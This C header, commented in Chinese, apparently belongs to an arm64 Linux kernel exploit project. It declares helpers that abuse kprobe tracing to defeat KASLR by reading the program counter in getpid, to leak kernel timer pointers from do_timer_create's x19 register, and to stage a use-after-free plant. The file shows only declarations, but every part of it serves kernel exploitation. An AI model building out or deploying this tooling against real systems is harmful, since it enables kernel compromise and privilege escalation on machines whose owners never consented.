#ifndef KPROBE_H
#define KPROBE_H

#include <stdint.h>

/* 必须先包含 kernel_offsets.h：KO_TIMER_ALLOC_PROBE_OFF 开关在这里定义，
 * 这样 kprobe.h 自身即可见开关，不依赖包含方的包含顺序。 */
#include "kernel_offsets.h"

/*
 * kprobe.h - nezha/popsicle 的 kprobe 读寄存器法
 *            （KO_TIMER_ALLOC_PROBE_OFF != 0 时由调用方选用）
 *
 * 通过 /sys/kernel/tracing/kprobe_events 动态插桩，直接读取 CPU 寄存器：
 *   - kprobe_measure_slide()          ：kprobe __arm64_sys_getpid 读 %pc，slide = ip - KO_LINK_GETPID
 *   - kprobe_leak_timer_ptrs()        ：kprobe do_timer_create+<off> 读 %x19，批量拿 timer 指针
 *   - kprobe_timer_probe_begin/collect：分阶段会话（timer 由子进程创建时用）
 *
 * 实现总是参与编译，是否走这条路只由 KO_TIMER_ALLOC_PROBE_OFF 决定。
 */

/* 测 KASLR slide。成功返回 0 并写入 *slide_out。 */
int kprobe_measure_slide(uint64_t *slide_out);

/* 批量泄露：probe 一次，创建最多 max 个 timer，读回所有 timer= 值到 ptrs。
 * 成功返回 0，实际读到的数量写入 *out_n。 */
int kprobe_leak_timer_ptrs(uint64_t *ptrs, int max, int *out_n);

/* 分阶段会话：用于 uaf_plant —— timer 由子进程 exec_fn 创建，
 * 所以把"插桩"和"读回"拆成两步。 */
struct kprobe_session {
	char group[64];
	char event[64];
	int active;
};

/* 插桩并开启 tracing（会清空 trace）。成功后 s->active=1。 */
int kprobe_timer_probe_begin(struct kprobe_session *s);

/* 关闭 tracing、按线程 tid 过滤读回所有 timer= 值到 ptrs（最多 max 个）、并拆除插桩。
 * tid < 0 表示不过滤线程。成功返回 0，数量写入 *out_n。 */
int kprobe_timer_probe_collect(struct kprobe_session *s, long tid,
			       uint64_t *ptrs, int max, int *out_n);

#endif /* KPROBE_H */
